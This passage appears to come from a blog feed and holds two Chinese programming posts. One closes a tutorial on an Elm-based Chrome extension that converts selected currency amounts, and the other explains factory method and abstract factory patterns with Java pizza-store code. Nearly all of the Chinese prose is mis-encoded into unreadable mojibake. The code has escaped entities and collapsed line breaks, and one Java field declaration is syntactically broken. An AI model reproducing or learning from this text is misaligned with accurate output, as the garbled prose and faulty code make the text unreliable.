Content ä¸­çš„ Main.elm ä¸»è¦è² è²¬æ¥æ”¶åˆ°æ›´æ–°çš„ Modelï¼Œç„¶å¾Œå°‡å…¶æ›´æ–°åˆ° DOM ä¸Šï¼š
-- çœç•¥ import packages-- PORTS FROM JAVASCRIPTport onState : (Model -&gt; msg) -&gt; Sub msginit : Model -&gt; ( Model, Cmd Msg )init model =    ( model    , Cmd.none    )type Msg    = NoOp    | NewState Modelupdate : Msg -&gt; Model -&gt; ( Model, Cmd Msg )update msg model =    case msg of        NoOp -&gt;            ( model, Cmd.none )        NewState newModel -&gt;            ( newModel, Cmd.none )view : Model -&gt; Html Msgview model =    Html.div        [ Html.Attributes.class &quot;Content&quot;        ]        [          Html.text (&quot;It&#x27;s &quot;),          Html.div            [ Html.Attributes.class &quot;InnerContent&quot;            ]            [                Html.div [][                    Html.text (round 2 model.result)                ],                Html.div                    [ Html.Attributes.class &quot;units&quot;                    ]                    [                        Html.text (&quot; TWD&quot;)                    ]            ]        ]subscriptions : Model -&gt; Sub Msgsubscriptions model =    onState NewStatemain : Program Model Model Msgmain =    Browser.element        &#123; init = init        , update = update        , view = view        , subscriptions = subscriptions        &#125;

è°æ˜çš„è®€è€…çœ‹åˆ°é€™æ®µ code æ‡‰è©²æœƒç™¼ç¾ï¼Œé€™é‚Šçš„ port, init èˆ‡ subscriptions åŸºæœ¬ä¸Šå½¢å¼èˆ‡ Background çš„ä¸€æ¨£ï¼Œåªæ˜¯æ›´ç°¡å–®ä¸€é»ï¼Œç•¶ subscription æ”¶åˆ° JavaScript å‘¼å«çš„ onState å‡½æ•¸æ™‚ï¼Œæˆ‘å€‘å‚³é NewState Message çµ¦ updateï¼Œè€Œ update å°±åªæ˜¯å–®ç´”çš„å›å‚³æ–°çš„ Modelã€‚
å”¯ä¸€å·®åˆ¥åœ¨æ–¼ view èˆ‡ mainã€‚
åœ¨ Elm ä¸­ï¼Œview æœƒæ¥å— Model ç‚ºåƒæ•¸ï¼Œä¸¦å›å‚³ HTML DOMï¼Œåœ¨ç¯„ä¾‹ä¸­ï¼Œæˆ‘å€‘ç”¢ç”Ÿäº†ä¸‰å±¤çš„ divï¼Œç¬¬ä¸‰å±¤æœ‰å…©å€‹ div ä¸¦è¡Œï¼Œåˆ†åˆ¥å‘ˆç¾è½‰æ›å¾Œçš„åŒ¯ç‡æ•¸å­—ï¼Œä»¥åŠå–®ä½ï¼Œé€™é‚Šæˆ‘é‚„ç”¨äº†ä¸€å€‹ elm çš„ package ä¾† round æ•¸å­—åˆ°å°æ•¸é»å¾Œå…©ä½ã€‚
è€Œç”±æ–¼ Content çš„ Main.elm æœ‰è·Ÿ Browser äº’å‹•ï¼ˆç”¢ç”Ÿ HTMLï¼‰ï¼Œæ‰€ä»¥éœ€è¦çš„ä¸æ˜¯ Platform.worker è€Œæ˜¯ Browser.elementï¼Œä»–æœƒå°‡ View ä¹Ÿç¶å®šé€²å»ã€‚ï¼ˆä¸€æ¨£ï¼Œè©³æƒ…è«‹åƒç…§å®˜ç¶² Guide ï¼‰
index.js in Content.jsContent ä¸­çš„ JavaScript å°±æ›´å–®ç´”äº†ï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯ createElement å‡ºä¸€å€‹ divï¼Œä¸¦ä¸”è¨­å®š mouseup listenerï¼Œè®“ä½¿ç”¨è€…é¸å–æ–‡å­—å¾Œï¼Œèƒ½å¤  sendMessage çµ¦ background.jsï¼Œä¸¦ä¸”è¨­å®šå¥½ Elm DOM è¦æ›è¼‰çš„ Real Dom ä½ç½®èˆ‡ style (index.css)ï¼š
require(&#x27;./index.css&#x27;)const mountNode = document.createElement(&#x27;div&#x27;);document.body.append(mountNode);import &#123; Elm &#125; from &#x27;./Main.elm&#x27;;let app;document.addEventListener(&#x27;mouseup&#x27;, () =&gt; &#123;  // åˆ©ç”¨ window.getSelection() æŠ“å–ä½¿ç”¨è€…é¸å–çš„æ•¸å­—  const selectedObj = window.getSelection();  const selectedContent = selectedObj.toString();  //...  // é€™é‚Šå¿½ç•¥çš„ code ä¸»è¦åœ¨æ˜¯ï¼š  // è¨ˆç®— Elm ç”¢ç”Ÿçš„ DOM è©²æ’å…¥åˆ°é é¢ä¸­çš„å“ªå€‹ä½ç½®  // åˆ¤æ–·ä½•æ™‚è©²è®“ DOM æ¶ˆå¤±  //...  if (selectedContent &amp;&amp; selectedContent!== &#x27;&#x27;) &#123;    chrome.runtime.sendMessage(&#123; kind: &#x27;selected&#x27;, selectedContent &#125;);  &#125;&#125;);const port = chrome.runtime.connect(&#123; name: &#x27;broadcast&#x27; &#125;);port.onMessage.addListener(state =&gt; &#123;  if (!app) &#123;    app = Elm.Main.init(&#123;      node: mountNode,      flags: state    &#125;);    return;  &#125;  app.ports.onState.send(state);&#125;)

åœ¨ port.onMessage çš„ listener ä¸­ï¼Œæˆ‘å€‘æœƒç›£è½åˆ°ç”± Background.js å‚³éä¾†çš„åˆå§‹ Stateï¼Œç„¶å¾Œæ‰ init Content é€™é‚Šçš„ Elm applicationï¼Œä¸¦å°‡ Background.js å‚³ä¾†çš„ state ä¸€èµ·å‚³å…¥ï¼Œè‹¥å¾ŒçºŒæœ‰æ›´æ–° stateï¼Œå‰‡é€é port çš„ onState ä¾†æ›´æ–°ã€‚
åŸºæœ¬ä¸Šé€™æ¨£ä¸€ä¾†ï¼Œæ•´å€‹ Extension çš„å·¥ä½œå°±å®Œæˆäº†ï¼Œä½†çœç•¥äº†ä¸å°‘ç´°ç¯€ï¼Œå®Œæ•´ç¨‹å¼ç¢¼èˆ‡å…¶ä»–ç´°ç¯€åªå¥½è«‹å¤§å®¶ç›´æ¥çœ‹åŸå§‹ç¢¼æœƒæ›´æ¸…æ¥šä¸€é»ï¼š source code
å¦‚ä½• Debugåœ¨ç”¨ Elm è£½ä½œ Chrome extension çš„éç¨‹ä¸­ï¼ŒDebug çš„æ–¹å¼å…¶å¯¦è·Ÿä¸€èˆ¬ç”¨ JS é–‹ç™¼ä¸€æ¨£ï¼Œéƒ½æ˜¯é€é inspect å¾ browser ä¸­åˆ° background.js èˆ‡ content.js ä¸‹ä¸­æ–·é»ï¼Œä½†æ˜¯éº»ç…©çš„æ˜¯ï¼Œåœ¨é€™é‚Šçš„ background.js èˆ‡ content.js éƒ½æœ‰ä¸€å¤§éƒ¨åˆ†æ˜¯ Elm compile å‡ºä¾†çš„ JSï¼Œæ˜¯æ²’æœ‰é¡ä¼¼ source map çš„æ±è¥¿èƒ½è®“ä½ ç›´æ¥åœ¨ Elm code å…§ Debug çš„ï¼Œæ‰€ä»¥é™¤éŒ¯èµ·ä¾†çœŸçš„ä¸æ˜¯å¾ˆæ–¹ä¾¿ï¼Œä¹‹å¾Œè‹¥æœ‰ç ”ç©¶åˆ°æ–¹æ³•å†ä¾†æ›´æ–°ã€‚ä¹Ÿæ­¡è¿å¤§å®¶çµ¦äºˆæŒ‡å°ï¼
çµè«–èˆ‡å¿ƒå¾—Elm çš„ç¢ºæ˜¯è »å„ªé›…çš„èªè¨€ï¼Œä½†ä¸æ˜¯èƒ½åœ¨çŸ­æ™‚é–“å…§å®Œç¾é§•é¦­çš„â€¦å°¤å…¶æ˜¯ Debug çš„é›£åº¦ä»¥åŠæ–‡ä»¶ç¯„ä¾‹çš„ç›¸å°ç¨€å°‘ï¼Œéƒ½è®“äººå®¹æ˜“é€€å»ï¼Œä½†æˆ‘é‚„æ˜¯è »é–‹å¿ƒèƒ½åˆ©ç”¨é€™æ¬¡æ©Ÿæœƒè¦ªæ‰‹ç©ç© Elmï¼Œä¸¦ä¸”è£½ä½œäº†ä¸€å€‹æˆ‘ç”¨å¾—ä¸Šçš„å·¥å…·ï¼Œç•¶ç„¶é‚„æœ‰ä¸€äº›éœ€è¦æ”¹å–„çš„éƒ¨åˆ†ï¼Œä½†å·²ç¶“å ªç”¨äº†ã€‚å¸Œæœ›ä¹‹å¾Œé‚„èƒ½æœ‰æ™‚é–“ç¹¼çºŒç ”ç©¶ï¼æœ‰èˆˆè¶£çš„è®€è€…æˆ–è¨±èƒ½ä¸€èµ·åŠ å…¥ä»–å€‘çš„ Community è¨è«–ï¼
è³‡æ–™ä¾†æº
elm-lang
Beginning Elm
elm github
Elm ä½œè€… ï½€2012 å¹´çš„æ¼”è¬›å½±ç‰‡
Elmâ€”â€”å‡½æ•°å¼å‰ç«¯æ¡†æ¶ä»‹ç»

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>Elm</tag>
        <tag>Chrome extension</tag>
      </tags>
  </entry>
  <entry>
    <title>è¨­è¨ˆæ¨¡å¼ - å·¥å» æ–¹æ³•åŠæŠ½è±¡å·¥å» </title>
    <url>/2017/05/22/factory-method-and-abstract-factory/</url>
    <content><![CDATA[ä»¥ä¸‹æ–‡ç« æ˜¯é–±è®€ æ·±å…¥æ·ºå‡º Design Patternï¼Œé‚„æœ‰ è–ç¶“çš„ç­†è¨˜ï¼Œè¦æ›´æ·±å…¥çš„ç†è§£ä¸€å®šè¦å»çœ‹é€™å…©æœ¬æ›¸ã€‚åœ–ç‰‡æˆªåœ–è‡ª lynda.com çš„Foundations of Programming: Design Patternsï¼Œé€™æ˜¯å­¸ç¿’è¨­è¨ˆæ¨¡å¼éå¸¸å¥½çš„èª²ç¨‹ã€‚
ä¾†é»å€‹ Pizza å§ä»Šå¤©æƒ³è¨­è¨ˆä¸€å€‹PizzaStoreï¼Œè£¡é¢å¯ä»¥é» Pizzaã€‚
public class PizzaStore &#123;    Pizza orderPizza(String type)&#123;    	Pizza pizza;    	if(type.equals(&quot;cheese&quot;))&#123;	    pizza = new CheesePizza();    	&#125;else if(type.equals(&quot;greek&quot;))&#123;	    pizza = new GreekPizza();    	&#125;else if(type.equals(&quot;pepperoni&quot;))&#123;	    pizza = new PepperoniPizza();    	&#125;    	pizza.prepare();    	pizza.cook();    	return pizza    &#125;&#125;

çœ‹èµ·ä¾†ä¸å·®ã€‚compile-time çš„æ™‚å€™ pizza.prepare() è·Ÿ pizza.cook() æ˜¯å“ªä¸€ç¨® pizza æˆ‘ä¸ç”¨çŸ¥é“ ï¼Œæˆ‘åªè¦ä¿è­‰å„å€‹ Pizza çš„ subclass æœ‰å¯¦ä½œ prepare() å’Œ cook() å°±å¯ä»¥ ã€‚
Polymorphism Rocks!
ä½†åªè¦æœ‰æ–°çš„ Pizza æ¨å‡ºæˆ–æ˜¯æœ‰èˆŠçš„è¦æ‹¿æ‰ï¼Œéœ€è¦æ”¹é€™è£¡çš„ if-else æœ‰é»éº»ç…©ã€‚
ç°¡å–®å·¥å» æ¨¡å¼åˆ¥å¿˜äº† Design Pattern rule #1: Encapsulate what varies
æŠŠå‰›å‰› orderPizza() è£¡é¢çš„æ‰€æœ‰ if-else æ‹‰å‡ºä¾†åˆ°ä¸€å€‹å·¥å» è£¡ï¼Œé€™å€‹å·¥å» å°ˆé–€è£½ä½œ pizzaã€‚
public class SimplePizzaFactory &#123;    public Pizza createPizza(String type) &#123;	Pizza pizza = null;	if(type.equals(&quot;cheese&quot;))&#123;	    pizza = new CheesePizza();    	&#125;else if(type.equals(&quot;greek&quot;))&#123;	    pizza = new GreekPizza();    	&#125;else if(type.equals(&quot;pepperoni&quot;))&#123;	    pizza = new PepperoniPizza();    	&#125;    	return pizza;    &#125;&#125;

å°±é€™éº¼ç°¡å–®ï¼Œé€™å°±æ˜¯ç°¡å–®å·¥å»  ã€‚
ç°¡å–®å·¥å» ç®¡ç†ç‰©ä»¶çš„å‰µé€ ï¼Œå¦‚æœ client è¦å–å¾—ç‰©ä»¶ï¼Œåªè¦çµ¦ç°¡å–®å·¥å» æ­£ç¢ºçš„åƒæ•¸å°±å¯ä»¥ã€‚
ç„¶å¾Œ pizza åº—çš„ constructor è¦ä¸Ÿä¸€å€‹å·¥å» é€²å»ã€‚
public class PizzaStore &#123;    SimplePizzaFactory factory;    public PizzaStore(SimplePizzaFactory factory) &#123; 	this.factory = factory;    &#125;    public Pizza orderPizza(String type) &#123;	Pizza pizza;	pizza = factory.createPizza(type);	pizza.prepare();	pizza.cook();	return pizza;    &#125;&#125;

ç°¡å–®å·¥å» æ¨¡å¼ï¼Œè®“æˆ‘å€‘æŠŠ pizza çš„å‰µé€ å’Œ pizza çš„ä½¿ç”¨åˆ†é–‹äº†ï¼Œæ¸›å°‘äº† client å°æ–¼å¯¦ä½œçš„ä¾è³´ã€‚
æˆ‘å€‘æˆåŠŸçš„åˆ¤æ–·å‡º orderPizza é€™å€‹å‡½æ•¸è£¡é¢æœƒè®Šå‹•çš„éƒ¨åˆ†ï¼Œåˆ†é›¢å‡ºä¸€å€‹å·¥å» ï¼Œå»è™•ç†ä»–ã€‚å¦‚æœä½ ä»Šå¤©è¦æ”¹è®Šè™•ç†æ–¹å¼ï¼Œä½ å»æ”¹é‚£å€‹å·¥å» æˆ–æ˜¯çµ¦æˆ‘ä¸€å€‹æ–°å·¥å» å°±å¯ä»¥ã€‚æˆ‘ä¸ç®¡ä½ æ€éº¼å‰µé€ çš„ï¼Œæˆ‘åªåœ¨ä¹ä½ å›å‚³çµ¦æˆ‘çš„ object çš„ class æ˜¯ Pizza çš„ subclassã€‚

ç°¡å–®å·¥å» æ¨¡å¼çš„å„ªé»å°±æ˜¯åˆ†é›¢äº†ç‰©ä»¶çš„ä½¿ç”¨å’Œå‰µé€ ã€‚client ä¸ç®¡ä½ æ€éº¼ç”Ÿæˆçš„ï¼Œä½†ç¼ºé»ä¹Ÿå¾ˆæ˜ç¢ºï¼Œæ¯ç•¶æœ‰æ–°çš„ class å‡ºä¾†å·¥å» å°±è¦æ”¹ï¼Œè¤‡é›œåº¦ä¸Šå‡å¾—å¾ˆå¿«ã€‚
é©ç”¨æƒ…æ³æ˜¯éœ€è¦å‰µå»ºçš„ç¨®é¡æ¯”è¼ƒå°‘ï¼Œè€Œä¸”å®¢æˆ¶å°æ–¼æ€éº¼å‰µå»ºå°è±¡çš„æ–¹æ³•ä¸é—œå¿ƒã€‚
ç”Ÿæ„ä¸éŒ¯ é–‹å€‹åˆ†åº—å¯¦ä½œäº†ç°¡å–®å·¥å» æ¨¡å¼ä¹‹å¾Œï¼ŒåŒæ¨£æ˜¯ cheese pizzaï¼Œç´ç´„è·ŸèŠåŠ å“¥çš„åšæ³•å°±å®Œå…¨ä¸ä¸€æ¨£ã€‚æˆ‘å€‘å¯ä»¥ä¿®æ”¹ SimplePizzaFactory è®“ createPizza å¤šåƒä¸€å€‹åƒæ•¸ styleã€‚
public class SimplePizzaFactory &#123;    public Pizza createPizza(String style, String type) &#123;	Pizza pizza = null;	if(style.equals(&quot;NY&quot;))&#123;	    if(type.equals(&quot;cheese&quot;))&#123;	    	pizza = new NYStyleCheesePizza();    	    &#125;else...	    ...	&#125;else if(style.equals(&quot;chicago&quot;))&#123;	    if(type.equals(&quot;cheese&quot;))&#123;                pizza = new ChicagoStyleCheesePizza();            &#125;else...                ...	&#125;    	return pizza;    &#125;&#125;
å¥½å•¦æˆ‘å€‘éƒ½é‚£éº¼ç†Ÿäº†ï¼Œå†æ¼”å°±ä¸åƒäº†ï¼Œæˆ‘å€‘åœ¨é€™è£¡æ‡‰è©²ç”¨ç¹¼æ‰¿ã€‚
ChicagoPizzaFactory è·Ÿ NYPizzaFactory éƒ½ç¹¼æ‰¿è‡ª SimplePizzaFactoryã€‚ç¾åœ¨æˆ‘å€‘éœ€è¦ç‚ºä¸åŒ style çš„ PizzaStore å»ºç«‹ä¸åŒçš„å·¥å» ã€‚
å¦‚æœä»Šå¤©æˆ‘è¦é» NY é¢¨å‘³çš„èµ·å¸ pizzaã€‚
NYPizzaFactory nyFactory = new NYPizzaFactory();PizzaStore nyStore = new PizzaStore(nyFactory);nyStore.orderPizza(&quot;cheese&quot;);
æ˜å¤©æˆ‘æƒ³é»èŠåŠ å“¥é¢¨å‘³çš„èµ·å¸ pizza
ChicagoPizzaFactory chicagoFactory = new ChicagoPizzaFactory()PizzaStore chicagoStore = new PizzaStore(chicagoFactory);chicagoStore.orderPizza(&quot;cheese&quot;);

çœ‹ä¼¼æ²’å•¥å•é¡Œï¼Œæˆ‘å€‘ç¾åœ¨å…¶å¯¦é€²å…¥äº†è¦‹å±±ä¸æ˜¯å±±è¦‹æ°´ä¸æ˜¯æ°´çš„å¢ƒç•Œã€‚

ç‚ºä»€éº¼é€™éº¼èªªå‘¢ï¼Ÿæˆ‘å€‘ç‚ºäº†decoupleç‰©ä»¶çš„å‰µé€ å’Œç‰©ä»¶çš„ä½¿ç”¨ï¼Œè£½é€ äº†ä¸€å€‹å·¥å» ã€‚å¯æ˜¯ç‚ºäº† reuse å·¥å» çš„ codeï¼Œæˆ‘å€‘ä½¿ç”¨äº†ç¹¼æ‰¿ã€‚
ç¾åœ¨æˆ‘çš„ SimplePizzaFactory å…¶å¯¦åªæ˜¯ä¸€å€‹ä»‹é¢ï¼Œæˆ‘å®šç¾©äº†æ‰€æœ‰ç¹¼æ‰¿äº†æˆ‘çš„ class æ‡‰è©²è¦åšä»€éº¼äº‹ï¼ˆè¿”å› customized defined pizzaï¼‰ï¼ŒçœŸæ­£å¯¦éš›å‰µé€ ç‰©ä»¶çš„åœ°æ–¹æ˜¯å­é¡åˆ¥çš„å¯¦é«”å·¥å» ã€‚
é€™å…©ç¨®åŠŸèƒ½ï¼ˆdecouple + hierarchyï¼‰åŒæ™‚éœ€è¦çš„æ™‚å€™ï¼Œæˆ‘å€‘å°±å¯ä»¥ç”¨ä¸Šä»Šå¤©çš„ä¸»è§’ã€‚
å·¥å» æ–¹æ³•æ¨¡å¼å·¥å» æ–¹æ³•æ¨¡å¼å®šç¾©äº†ä¸€å€‹å»ºç«‹ç‰©ä»¶çš„ä»‹é¢ï¼Œä½†ç”±å­é¡æ±ºå®šè¦å¯¦ä¾‹åŒ–çš„é¡åˆ¥ç‚ºä½•ã€‚å·¥å» æ–¹æ³•è®“é¡åˆ¥æŠŠ å¯¦ä¾‹åŒ– çš„å‹•ä½œæ¨é²åˆ°äº†å­é¡ã€‚
æˆ‘å€‘ç¾åœ¨æŠŠ createPizza æ‹‰å›ä¾† PizzaStore è£¡ï¼Œè®“å­é¡åˆ¥ä¾†æ±ºå®šæ€éº¼ createPizzaã€‚
public abstract class PizzaStore &#123;    abstract Pizza createPizza(String type);    public Pizza orderPizza(String type) &#123;	Pizza pizza = createPizza(type);	pizza.prepare();	pizza.cook();	return pizza;    &#125;&#125;
createPizzaæ˜¯æŠ½è±¡æ–¹æ³•ï¼Œç•™çµ¦å­é¡åˆ¥ç¹¼æ‰¿ã€‚
è®“ NYPizzaStore å»ç¹¼æ‰¿ PizzaStoreï¼Œå¯¦ä½œ createPizzaã€‚
public class NYPizzaStore extends PizzaStore &#123;    Pizza createPizza(String item) &#123;	if (item.equals(&quot;cheese&quot;)) &#123;   	    return new NYStyleCheesePizza();	&#125; else if (item.equals(&quot;veggie&quot;)) &#123;	    return new NYStyleVeggiePizza();	&#125; else if (item.equals(&quot;clam&quot;)) &#123;	    return new NYStyleClamPizza();	&#125; else if (item.equals(&quot;pepperoni&quot;)) &#123;	    return new NYStylePepperoniPizza();	&#125; else return null;    &#125;&#125;

åŸæœ¬æˆ‘ç‰©ä»¶çš„å»ºç«‹ï¼Œäº¤çµ¦ä¸€å€‹å¤–ä¾†çš„å·¥å» è™•ç†ï¼Œç¾åœ¨æˆ‘æŠŠå®ƒäº¤çµ¦æˆ‘çš„å­é¡åˆ¥è™•ç†ï¼Œè€Œä¸”çˆ¶é¡åˆ¥é‚„å¯ä»¥ callå­é¡åˆ¥å¯¦ä½œçš„å‡½æ•¸ã€‚é€™ç¨®æœƒäº’ call çš„ function é€šå¸¸ä¾è³´æ€§éƒ½å¾ˆé«˜ï¼Œä½†æˆ‘å€‘åˆ©ç”¨å·¥å» æ¨¡å¼è®“çˆ¶é¡åˆ¥è·Ÿå­é¡åˆ¥çš„ä¾è³´é¬†ç¶ï¼ˆdecoupleï¼‰äº†ã€‚
å¥—ç”¨äº†å·¥å» æ–¹æ³•æ¨¡å¼ä¹‹å¾Œï¼Œæ€éº¼é» pizza å‘¢ï¼Ÿ
PizzaStore nyStore = new NYPizzaStore();Pizza pizza = nyStore.orderPizza(&quot;cheese&quot;);

è¼•é¬†ï¼
çµæ§‹

Productï¼ˆPizzaï¼‰: å®šç¾© factoryMethodï¼ˆcreatePizzaï¼‰ æ‰€é€ ç‰©ä»¶çš„ä»‹é¢ã€‚

ConcreteProductï¼ˆNYStyleCheesePizzaï¼‰: å¯¦ä½œ Productã€‚

Creatorï¼ˆPizzaStoreï¼‰: å®£å‘Š factoryMethodï¼ˆå¿…é ˆå‚³å›Productï¼‰ï¼Œå’Œå…¶ä»– client å¯ä»¥ call çš„ APIã€‚

ConcreteCreatorï¼ˆNYPizzaStoreï¼‰: å¯¦ä½œ factoryMethodï¼Œå›å‚³ ConcreteProduct çš„ instanceã€‚


æœ‰å€‹å°ç´°ç¯€ï¼Œå…¶å¯¦å·¥å» æ–¹æ³•ä¸ä¸€å®šæ˜¯ abstractã€‚ä¹Ÿå¯ä»¥ Creator å°±å…ˆå·å·å¯¦ä½œ factoryMethodï¼Œå›å‚³ Productï¼Œsubclass å¯ä»¥é¸æ“‡è¦ä¸è¦ override å·¥å» æ–¹æ³•ã€‚
å„ªç¼ºé»å„ªé»é™¤äº†è·Ÿç°¡å–®å·¥å» ä¸€æ¨£ï¼Œéš±è—äº†å‰µå»ºç‰©ä»¶çš„ç´°ç¯€ï¼Œæœ€é‡è¦çš„æ˜¯åŠ å…¥æ–°ç”¢å“ä¸éœ€è¦æ”¹å‹• Creatorï¼Œä½ ç›´æ¥ç¹¼æ‰¿ Creator å°±å¥½äº† ã€‚
Client çš„ç”¨æ³•éƒ½æ˜¯ä¸€æ¨£ä¸éœ€è¦æ”¹ï¼Œå®Œå…¨ç¬¦åˆé–‹æ”¾å°é–‰å®ˆå‰‡ã€‚
ç¼ºé»å°±æ˜¯ ConcreteCreator è·Ÿ ConcreteProduct æœƒæˆå°çš„å¢åŠ ã€‚æ¯”å¦‚ä½ ä»Šå¤©æƒ³åšåŠ å·æŠ«è–©ï¼Œä½ åœ¨å®šç¾©å®ŒåŠ å· pizzaä¹‹å¾Œï¼Œé‚„è¦å†å®šç¾©ä¸€å€‹åŠ å· pizza å·¥å» ã€‚

å·¥å» æ–¹æ³•çš„é™åˆ¶å·¥å» æ–¹æ³•çš„ factoryMethodï¼Œåªèƒ½å‰µå»ºä¸€å€‹å°è±¡ï¼Œæ¯”å¦‚èªª Pizza ã€‚
ä½†å¦‚æœæˆ‘å€‘æƒ³è¦æ›´åŠ ç´°åˆ†æƒ³å‰µå»ºçš„æ±è¥¿ï¼Œæ¯”å¦‚èªª Pizza çš„æ‰€éœ€åŸæ–™ï¼ˆéºµåœ˜ã€é†¬æ–™ã€èµ·å¸ã€è›¤è £ï¼‰ã€‚å¦‚æœæˆ‘å€‘ç”¨å·¥å» æ–¹æ³•çš„è©±ï¼Œæˆ‘å€‘éœ€è¦ç‚ºæ¯ä¸€å€‹åŸæ–™éƒ½å‰µä¸€å€‹å·¥å» ã€‚
åœ¨é€™å€‹ä¾‹å­å°±æ˜¯ NY éºµåœ˜å·¥å» ã€NY é†¬æ–™å·¥å» ã€NY èµ·å¸å·¥å» ã€NY è›¤è £å·¥å» ã€Chicago éºµåœ˜å·¥å» ã€Chicago é†¬æ–™å·¥å» ã€Chicago èµ·å¸å·¥å» ã€Chicago è›¤è £å·¥å» ã€‚
å› ç‚ºæ¯å€‹å·¥å» æ–¹æ³•åªèƒ½ç”Ÿç”¢ä¸€å€‹ç”¢å“ã€‚
public class NYPizzaStore extends PizzaStore &#123;    Pizza createPizza(String item) &#123;	DoughFactory doughFactory = new NYDoughFactory();	SauceFactory sauceFactory = new NYSauceFactory();	CheeseFactory cheeseFactory = new NYCheeseFactory();	ClamFactory clamFactory = new NYClamFactory();	if (item.equals(&quot;cheese&quot;)) &#123;    	    return new NYStyleCheesePizza(doughFactory, 		sauceFactory, cheeseFactory);	&#125; else if (item.equals(&quot;veggie&quot;)) &#123;	    return new NYStyleVeggiePizza(doughFactory, 		sauceFactory, cheeseFactory);	&#125; else if (item.equals(&quot;clam&quot;)) &#123;	    return new NYStyleClamPizza(doughFactory, 		sauceFactory, cheeseFactory, clamFactory);	&#125; else if (item.equals(&quot;pepperoni&quot;)) &#123;	    return new NYStylePepperoniPizza(doughFactory, 		sauceFactory, cheeseFactory);	&#125; else return null;    &#125;&#125;

é€™æ¨£å¯¦åœ¨æ˜¯å¤ªé›£ maintain äº†ã€‚æ‰€ä»¥æˆ‘å€‘æŠŠç›¸é—œçš„ç”¢å“ï¼ˆNY éºµåœ˜å·¥å» ã€NY é†¬æ–™å·¥å» ã€NY èµ·å¸å·¥å» ã€NY è›¤è £å·¥å» ï¼‰çµ„æˆä¸€å€‹ç”¢å“æ—ï¼Œäº¤çµ¦åŒä¸€å€‹å·¥å» ä¾†ç”Ÿç”¢ï¼Œé¼é¼å¤§åçš„æŠ½è±¡å·¥å» å°±èª•ç”Ÿäº†ã€‚

æŠ½è±¡çš„ Pizza åŸæ–™å·¥å» å®šç¾©äº†æ¯å€‹åŸæ–™å·¥å» è¦å‰µå»ºçš„æ±è¥¿çš„ä»‹é¢ã€‚æ¯å€‹ç¹¼æ‰¿äº† Pizza åŸæ–™å·¥å» çš„å…·é«”åŸæ–™å·¥å» ä¹–ä¹– implement æ‰€æœ‰éœ€è¦å‰µå»ºçš„æ±è¥¿ã€‚
å†ä¾†äº›ä¾‹å­ï¼Œå¦‚æœå·¥å» æ–¹æ³•ç”Ÿç”¢çš„æ˜¯æˆ¿å­ï¼ŒæŠ½è±¡å·¥å» å¯ä»¥ç”Ÿç”¢ä¸€å€‹æˆ¿å­çš„æ‰€æœ‰å®¶å…·ï¼ˆæ²™ç™¼é›»è¦–é›»é¢¨æ‰‡ï¼‰ã€‚å¦‚æœå·¥å» æ–¹æ³•ç”Ÿç”¢çš„æ˜¯æ­¦å£«ï¼ŒæŠ½è±¡å·¥å» å¯ä»¥ç”Ÿç”¢ä¸€å€‹æ­¦å£«çš„æ‰€æœ‰é…å‚™ï¼ˆç›”ç”²ã€é‹å­ã€æ‰‹å¥—ï¼‰ã€‚
ç¬¬ä¸€çœ¼çœ‹èµ·ä¾†å¾ˆå¯æ€•ï¼Œä½†å…¶å¯¦åªæ˜¯æŠŠå·¥å» çš„è²¬ä»»å¾ç”Ÿç”¢ä¸€å€‹ç”¢å“ï¼Œè®Šæˆç”Ÿç”¢ä¸€å€‹ç”¢å“æ—ã€‚
ç”¢å“æ—å’Œç”¢å“ç­‰ç´šçµæ§‹å…ˆè§£é‡‹å…©å€‹åè©ã€‚
ç”¢å“ç­‰ç´šçµæ§‹ï¼šç”¢å“çš„ç¹¼æ‰¿çµæ§‹ã€‚æ¯”å¦‚ä¸€å€‹æŠ½è±¡é¡æ˜¯éºµç³°ï¼Œå­é¡åˆ¥æœ‰ Chicago éºµåœ˜è·Ÿ NY éºµåœ˜ï¼Œé€™ä¸‰å€‹å½¢æˆäº†ä¸€å€‹ç”¢å“ç­‰ç´šçµæ§‹ã€‚
ç”¢å“æ—ï¼šåŒä¸€å€‹å·¥å» ç”Ÿç”¢çš„æ‰€æœ‰ç”¢å“ï¼Œå…¶ä¸­çš„æ¯å€‹ç”¢å“éƒ½æ˜¯åº§è½åœ¨ä¸åŒçš„ç”¢å“ç­‰ç´šçµæ§‹ä¸­çš„å…¶ä¸­ä¸€å€‹ç”¢å“ã€‚
ä¸€åœ–å‹éåƒè¨€è¬èªã€‚
å¥—ç”¨æŠ½è±¡å·¥å» å¾Œpublic class CheesePizza extends Pizza &#123;    PizzaIngredientFactory = ingredientFactory;    public CheesePizza(PizzaIngredientFactory ingredientFactory)&#123;	this.ingredientFactory = ingredientFactory;    &#125;    void prepare()&#123;	dough = ingredientFactory.createDough();	sauce = ingredientFactory.createSauce();	cheese = ingredientFactory.createCheese();    &#125;&#125;
è‡³æ–¼ PizzaStore è·Ÿä»–çš„å­é¡ï¼Œæ¦‚å¿µè·Ÿå·¥å» æ–¹æ³•ä¸€æ¨£ï¼Œç”±å­é¡æ±ºå®šè¦å¯¦ä¾‹åŒ–çš„é¡åˆ¥ç‚ºä½•ã€‚
public class NYPizzaStore extends PizzaStore &#123;    protected Pizza createPizza(String item) &#123;	Pizza pizza = null;	PizzaIngredientFactory ingredientFactory = new NYPizzaIngredientFactory();	if (item.equals(&quot;cheese&quot;)) &#123;   	    pizza = new CheesePizza(ingredientFactory);	&#125; else if (item.equals(&quot;veggie&quot;)) &#123;  	    pizza = new VeggiePizza(ingredientFactory);	&#125; else if (item.equals(&quot;clam&quot;)) &#123;	    pizza = new ClamPizza(ingredientFactory);	&#125; else if (item.equals(&quot;pepperoni&quot;)) &#123;	    pizza = new PepperoniPizza(ingredientFactory);				&#125; 	return pizza;    &#125;&#125;
é» pizza çš„æ–¹æ³•å°±è·Ÿå·¥å» æ–¹æ³•ä¸€æ¨£ã€‚
PizzaStore nyStore = new NYPizzaStore();Pizza pizza = nyStore.orderPizza(&quot;cheese&quot;);

å° client ä¾†èªªç”¨æ³•ä¸€æ¨£ï¼Œclient ä¸¦ä¸çŸ¥é“è£¡é¢çš„ç”¢å“å·²ç¶“è®Šæˆç”¢å“æ—ã€‚
